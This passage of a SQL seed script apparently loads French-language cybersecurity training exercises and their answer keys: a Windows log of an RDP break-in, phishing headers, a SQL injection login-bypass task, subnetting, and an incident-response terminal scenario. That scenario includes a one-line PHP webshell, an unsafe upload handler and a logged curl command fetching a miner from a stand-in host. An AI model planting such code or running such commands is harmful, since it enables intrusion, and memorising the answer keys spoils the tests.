203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48257},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:00:13","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : backup\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48258},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:01:17","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48259},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:01:21","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48260},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:01:25","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48261},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:02:29","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin.local\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48262},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:02:33","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin.local\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48263},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:02:37","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : administrateur\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48264},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:03:41","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin.local\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48265},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:03:45","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : administrateur\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48266},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 03:03:49","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 10\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : admin.local\nInformations sur le réseau :\n  Nom de la station de travail : -\n  Adresse du réseau source : 203.0.113.47","data":{"LogonType":"10","IpAddress":"203.0.113.47"},"rid":48267},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 03:04:51","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 10\nNom du compte : admin.local\nDomaine : ECOLE\nNom de la station de travail : -\nAdresse du réseau source : 203.0.113.47","data":{"TargetUserName":"admin.local","LogonType":"10","IpAddress":"203.0.113.47"},"rid":48268},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 03:09:17","source":"Microsoft-Windows-Security-Auditing","eventId":4720,"task":"User Account Management","computer":"SRV-DC01.ecole.local","message":"Un compte d'utilisateur a été créé.\n\nSujet :\n  Nom du compte : admin.local\nNouveau compte :\n  Nom du compte : svc_backup2","data":{"SubjectUserName":"admin.local","TargetUserName":"svc_backup2"},"rid":48269},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 03:09:40","source":"Microsoft-Windows-Security-Auditing","eventId":4732,"task":"Security Group Management","computer":"SRV-DC01.ecole.local","message":"Un membre a été ajouté à un groupe local dont la sécurité est activée.\n\nSujet :\n  Nom du compte : admin.local\nMembre :\n  Nom du compte : svc_backup2\nGroupe :\n  Nom du groupe : Administrateurs","data":{"MemberName":"svc_backup2","TargetUserName":"Administrateurs"},"rid":48270},{"log":"Système","level":"Information","time":"2026-10-27 03:12:05","source":"Service Control Manager","eventId":7045,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"Un service a été installé dans le système.\n\nNom du service : UpdaterSvc\nNom du fichier du service : C:\\Users\\Public\\upd.exe\nType de service : service en mode utilisateur\nType de démarrage du service : démarrage automatique\nCompte de service : LocalSystem","data":{"ServiceName":"UpdaterSvc","ImagePath":"C:\\Users\\Public\\upd.exe"},"rid":48271},{"log":"Système","level":"Information","time":"2026-10-27 06:00:15","source":"Service Control Manager","eventId":7036,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"Le service Windows Update est entré dans l'état : en cours d'exécution.","data":{},"rid":48272},{"log":"Application","level":"Information","time":"2026-10-27 06:30:06","source":"VSS","eventId":8224,"task":"Aucune","computer":"SRV-DC01.ecole.local","message":"Le service de cliché instantané des volumes est arrêté en raison du délai d'inactivité.","data":{},"rid":48273},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 07:23:04","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.6.178","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48274},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 07:54:45","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : a.benali\nDomaine : ECOLE\nNom de la station de travail : PC-ACCUEIL-02\nAdresse du réseau source : 10.20.7.66","data":{"TargetUserName":"a.benali","LogonType":"3","WorkstationName":"PC-ACCUEIL-02"},"rid":48275},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 07:55:10","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48276},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 07:55:19","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48277},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 07:56:28","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48278},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 07:56:37","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48279},{"log":"Sécurité","level":"Échec de l'audit","time":"2026-10-27 07:57:46","source":"Microsoft-Windows-Security-Auditing","eventId":4625,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"Échec d'ouverture de session d'un compte.\n\nType d'ouverture de session : 3\nCompte pour lequel l'ouverture de session a échoué :\n  Nom du compte : j.dupont\n  Domaine : ECOLE\nInformations sur l'échec :\n  Raison de l'échec : nom d'utilisateur inconnu ou mot de passe incorrect.\n  Statut : 0xC000006D  Sous-état : 0xC000006A\nInformations sur le réseau :\n  Nom de la station de travail : PC-COMPTA-07\n  Adresse du réseau source : 10.20.4.37","data":{"TargetUserName":"j.dupont","WorkstationName":"PC-COMPTA-07","IpAddress":"10.20.4.37","SubStatus":"0xC000006A"},"rid":48280},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 07:58:12","source":"Microsoft-Windows-Security-Auditing","eventId":4740,"task":"User Account Management","computer":"SRV-DC01.ecole.local","message":"Le compte d'un utilisateur a été verrouillé.\n\nCompte verrouillé :\n  Nom du compte : j.dupont\nInformations supplémentaires :\n  Nom de l'ordinateur appelant : PC-COMPTA-07","data":{"TargetUserName":"j.dupont","CallerComputerName":"PC-COMPTA-07"},"rid":48281},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 09:16:57","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-11\nAdresse du réseau source : 10.20.3.107","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-PEDA-11"},"rid":48282},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 09:32:37","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.2.100","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48283},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 10:10:46","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : c.morel\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.9.48","data":{"TargetUserName":"c.morel","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48284},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 11:54:15","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.4.44","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48285},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 12:42:53","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-ACCUEIL-02\nAdresse du réseau source : 10.20.1.60","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-ACCUEIL-02"},"rid":48286},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 13:25:46","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : l.garcia\nDomaine : ECOLE\nNom de la station de travail : PC-COMPTA-03\nAdresse du réseau source : 10.20.8.32","data":{"TargetUserName":"l.garcia","LogonType":"3","WorkstationName":"PC-COMPTA-03"},"rid":48287},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 15:30:18","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : k.martin\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.7.27","data":{"TargetUserName":"k.martin","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48288},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 16:54:54","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-11\nAdresse du réseau source : 10.20.8.191","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-PEDA-11"},"rid":48289},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 17:05:44","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : m.durand\nDomaine : ECOLE\nNom de la station de travail : PC-DIR-01\nAdresse du réseau source : 10.20.8.197","data":{"TargetUserName":"m.durand","LogonType":"3","WorkstationName":"PC-DIR-01"},"rid":48290},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 17:10:26","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : c.morel\nDomaine : ECOLE\nNom de la station de travail : PC-PEDA-04\nAdresse du réseau source : 10.20.9.15","data":{"TargetUserName":"c.morel","LogonType":"3","WorkstationName":"PC-PEDA-04"},"rid":48291},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 17:32:07","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : s.leroy\nDomaine : ECOLE\nNom de la station de travail : PC-ACCUEIL-02\nAdresse du réseau source : 10.20.3.152","data":{"TargetUserName":"s.leroy","LogonType":"3","WorkstationName":"PC-ACCUEIL-02"},"rid":48292},{"log":"Sécurité","level":"Succès de l'audit","time":"2026-10-27 18:20:10","source":"Microsoft-Windows-Security-Auditing","eventId":4624,"task":"Logon","computer":"SRV-DC01.ecole.local","message":"L'ouverture de session d'un compte s'est correctement déroulée.\n\nType d'ouverture de session : 3\nNom du compte : l.garcia\nDomaine : ECOLE\nNom de la station de travail : PC-ACCUEIL-02\nAdresse du réseau source : 10.20.6.42","data":{"TargetUserName":"l.garcia","LogonType":"3","WorkstationName":"PC-ACCUEIL-02"},"rid":48293}],"questions":[{"id":"lock_time","label":"Heure du verrouillage du compte le 27 octobre (événement 4740)","placeholder":"hh:mm:ss"},{"id":"lock_pc","label":"Nom du poste d'où viennent les échecs de connexion de j.dupont","placeholder":"PC-…"},{"id":"rdp_user","label":"Compte utilisé pour la connexion à distance (RDP) réussie depuis Internet","placeholder":"nom du compte"},{"id":"rdp_ip","label":"Adresse IP de l'attaquant","placeholder":"x.x.x.x"},{"id":"new_user","label":"Compte créé par l'attaquant pour garder un accès","placeholder":"nom du compte"},{"id":"service","label":"Nom du service installé par l'attaquant (journal Système)","placeholder":"nom du service"}]}$q$::jsonb, 6, $q$Cybersécurité (activité)$q$, 600, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"lock_time":["07:58:12","7:58:12"],"lock_pc":"PC-COMPTA-07","rdp_user":["admin.local","ECOLE\\admin.local"],"rdp_ip":"203.0.113.47","new_user":"svc_backup2","service":"UpdaterSvc"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'headers', $q$Ce mail a été signalé par un utilisateur. Analysez ses en-têtes bruts.$q$, $q${"raw":"Received: from mx.cybersup-ecole.example (mx.cybersup-ecole.example [192.0.2.25])\n        by mail.cybersup-ecole.example with ESMTPS id 7Hq2; Tue, 3 Nov 2026 08:14:09 +0100\nReceived: from relay.mailflux.example (relay.mailflux.example [198.51.100.77])\n        by mx.cybersup-ecole.example with ESMTP id 41fd; Tue, 3 Nov 2026 08:14:06 +0100\nReceived: from pc-0451 (unknown [203.0.113.45])\n        by relay.mailflux.example with SMTP id x9k2; Tue, 3 Nov 2026 08:13:21 +0100\nAuthentication-Results: mx.cybersup-ecole.example;\n       spf=fail (sender IP is 203.0.113.45) smtp.mailfrom=banque-horizon-secure.example;\n       dkim=none (message not signed);\n       dmarc=fail action=quarantine header.from=banque-horizon.example\nFrom: \"Service Client Banque Horizon\" <securite@banque-horizon.example>\nReply-To: <support-client@verif-compte-urgent.example>\nReturn-Path: <bounce@banque-horizon-secure.example>\nTo: <etudiant@cybersup-ecole.example>\nSubject: [URGENT] Votre compte sera suspendu sous 24 h\nDate: Tue, 3 Nov 2026 08:13:19 +0100\nMessage-ID: <20261103071319.4471@pc-0451>","view":"raw","ask":["origin_ip","spf","dkim","dmarc","reply_to","verdict"],"help":false,"body":"Cher client,\n\nNous avons détecté une activité inhabituelle sur votre compte. Sans vérification de votre part dans les 24 heures, votre compte sera suspendu et vos cartes bloquées.\n\nMerci de confirmer votre identité en cliquant sur le bouton ci-dessous.\n\nLe service client Banque Horizon","button":{"label":"Vérifier mon compte","url":"https://banque-horizon.verif-compte-urgent.example/connexion"}}$q$::jsonb, 2, $q$Cybersécurité (activité)$q$, 240, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"origin_ip":"203.0.113.45","spf":"fail","reply_to":"oui","verdict":"phishing","dkim":"none","dmarc":"fail"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'sql', $q$Ce formulaire de connexion construit sa requête en collant directement ce que tape l'utilisateur. Connectez-vous en tant qu'admin sans connaître son mot de passe.$q$, $q${"mode":"injection","help":false,"setup":"CREATE TABLE comptes (login TEXT, mdp TEXT, role TEXT);\nINSERT INTO comptes VALUES ('admin', 'Xk9!pq2#Lm', 'administrateur'), ('j.dupont', 'Soleil2026', 'utilisateur');","template":"SELECT login, role FROM comptes WHERE login = '{input}' AND mdp = 'mot_de_passe_inconnu'","field_label":"Identifiant"}$q$::jsonb, 2, $q$Cybersécurité (activité)$q$, 240, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q${"must_contain":"administrateur"}$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'subnet', $q$Segmentez le réseau du nouveau site entre les services, sans gaspiller d'adresses.$q$, $q${"mode":"vlsm","services":4,"help":false}$q$::jsonb, 3, $q$Réseaux (activité)$q$, 300, null) returning id into v_q;
    insert into answer_keys(question_id, correct) values (v_q, $q$null$q$::jsonb);
    v_pos := v_pos + 1;
    insert into questions(test_id, position, type, prompt, options, points, domain, time_limit_s, explanation) values (v_test, v_pos, 'terminal', $q$Mission terminal : un serveur de production est compromis. Menez la réponse à incident en conservant les preuves.$q$, null, 5, $q$Cybersécurité (activité)$q$, 720, null) returning id into v_q;
    insert into question_terminals(question_id, scenario, flag) values (v_q, $q${
  "user": "analyste",
  "hostname": "srv-prod",
  "home": "/home/analyste",
  "motd": "Connexion SSH à srv-prod. Alerte en cours : cat ~/ALERTE-SOC.txt\nAide-mémoire :\n  grep -rl motif dossier               trouver les fichiers qui contiennent un motif\n  sudo mv fichier dossier/             déplacer (en root)\n  sha256sum fichier > empreintes.txt   enregistrer une empreinte\n  grep motif journal | cut -d ' ' -f 1  extraire la 1re colonne (l'IP) des lignes trouvées\n  ps aux · sudo kill PID · sudo rm -r dossier · sudo sed -i '/motif/d' fichier\nsudo -l liste ce que vous pouvez faire en root ; help liste toutes les commandes.",
  "dirs": [
    {
      "path": "/var/www/html/uploads",
      "owner": "www-data"
    },
    {
      "path": "/home/deploy/.ssh",
      "owner": "deploy",
      "mode": "700"
    }
  ],
  "files": {
    "/home/analyste/ALERTE-SOC.txt": "ALERTE SOC · srv-prod · criticité haute\n\nL'EDR signale un processus inconnu à 99 % de CPU et des connexions sortantes vers un pool de minage.\nHypothèse : un fichier PHP malveillant a été déposé via le formulaire d'envoi d'avatars.\n\nVotre mission (gardez les preuves, ne détruisez pas le webshell) :\n1. Trouver le webshell dans /var/www/html et le déplacer dans ~/preuves/.\n2. Enregistrer son empreinte SHA-256 dans ~/preuves/empreintes.txt.\n3. Retrouver dans les journaux web l'IP qui a utilisé le webshell, l'écrire dans ~/preuves/ip_attaquant.txt.\n4. Arrêter le mineur et supprimer son dossier.\n5. L'attaquant a ajouté sa clé SSH au compte deploy : retirez-la, en gardant la clé légitime.\n",
    "/var/www/html/index.php": {
      "content": "<?php include 'header.php'; ?>\n<h1>Espace étudiants</h1>\n",
      "owner": "www-data"
    },
    "/var/www/html/upload.php": {
      "content": "<?php move_uploaded_file($_FILES['avatar']['tmp_name'], 'uploads/' . $_FILES['avatar']['name']); ?>\n",
      "owner": "www-data"
    },
    "/var/www/html/uploads/photo_lea.jpg": {
      "content": "(image JPEG)\n",
      "owner": "www-data"
    },
    "/var/www/html/uploads/photo_karim.jpg": {
      "content": "(image JPEG)\n",
      "owner": "www-data"
    },
    "/var/www/html/uploads/avatar.php": {
      "content": "<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>\n",
      "owner": "www-data"
    },
    "/var/log/apache2/access.log": {
      "content": "10.0.0.31 - - [03/Nov/2026:09:12:03 +0100] \"GET /index.php HTTP/1.1\" 200 5120\n10.0.0.44 - - [03/Nov/2026:09:20:17 +0100] \"POST /upload.php HTTP/1.1\" 200 88\n198.51.100.23 - - [03/Nov/2026:09:41:55 +0100] \"GET /index.php HTTP/1.1\" 200 5120\n203.0.113.66 - - [03/Nov/2026:10:02:31 +0100] \"POST /upload.php HTTP/1.1\" 200 88\n203.0.113.66 - - [03/Nov/2026:10:02:48 +0100] \"GET /uploads/avatar.php?cmd=id HTTP/1.1\" 200 54\n203.0.113.66 - - [03/Nov/2026:10:03:10 +0100] \"GET /uploads/avatar.php?cmd=curl%20-o%20/tmp/.x/kworkerd%20http://dl.example/k HTTP/1.1\" 200 0\n10.0.0.31 - - [03/Nov/2026:10:15:42 +0100] \"GET /uploads/photo_lea.jpg HTTP/1.1\" 200 40211\n",
      "owner": "root",
      "mode": "644"
    },
    "/tmp/.x/kworkerd": {
      "content": "(binaire ELF)\n",
      "owner": "www-data"
    },
    "/tmp/.x/config.json": {
      "content": "{\"pool\": \"pool.minexmr.example:4444\", \"wallet\": \"4AbC…\"}\n",
      "owner": "www-data"
    },
    "/home/deploy/.ssh/authorized_keys": {
      "content": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7deployEcoleKey0000000000000000000 deploy@ci-ecole\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpirate0000000000000000000000000 pirate@kali\n",
      "owner": "deploy",
      "mode": "600"
    }
  },
  "processes": [
    {
      "pid": 1,
      "user": "root",
      "cmd": "/sbin/init",
      "cpu": 0.1
    },
    {
      "pid": 690,
      "user": "root",
      "cmd": "/usr/sbin/apache2 -k start",
      "cpu": 0.4
    },
    {
      "pid": 4242,
      "user": "www-data",
      "cmd": "/tmp/.x/kworkerd -c /tmp/.x/config.json",
      "cpu": 99.1,
      "mem": 14.2
    },
    {
      "pid": 5010,
      "cmd": "-bash",
      "cpu": 0
    }
  ],
  "sudo": [
    "mv",
    "rm",
    "kill",
    "sed",
    "cat",
    "ls",
    "grep",
    "find",
    "sha256sum"
  ],
  "objectives": [
    {
      "id": "webshell",
      "title": "Webshell déplacé dans ~/preuves/ (pas supprimé)",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "contains",
            "path": "preuves/avatar.php",
            "text": "system($_GET"
          },
          {
            "type": "absent",
            "path": "/var/www/html/uploads/avatar.php"
          }
        ]
      }
    },
    {
      "id": "empreinte",
      "title": "Empreinte SHA-256 du webshell dans ~/preuves/empreintes.txt",
      "check": {
        "type": "contains",
        "path": "preuves/empreintes.txt",
        "text": "1e12386948a2464baf0c17904b45e858ef467c466bd6888e8d6bff681877575a"
      }
    },
    {
      "id": "ip",
      "title": "IP de l'attaquant dans ~/preuves/ip_attaquant.txt",
      "check": {
        "type": "contains",
        "path": "preuves/ip_attaquant.txt",
        "text": "203.0.113.66"
      }
    },
    {
      "id": "mineur",
      "title": "Mineur arrêté et son dossier supprimé",
      "check": {
        "type": "all",
        "checks": [
          {
            "type": "process_absent",
            "name": "kworkerd"
          },
          {
            "type": "absent",
            "path": "/tmp/.x"
          },
          {
            "type": "process_present",
            "name": "apache2"
          }
        ]
      }
    },
    {
      "id": "cle",
      "title": "Clé SSH de l'attaquant retirée, clé légitime conservée",
      "check": {
        "type": "equals",
        "path": "/home/deploy/.ssh/authorized_keys",
        "text": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7deployEcoleKey0000000000000000000 deploy@ci-ecole"
      }
    }
  ]
}$q$::jsonb, null);
    v_pos := v_pos + 1;
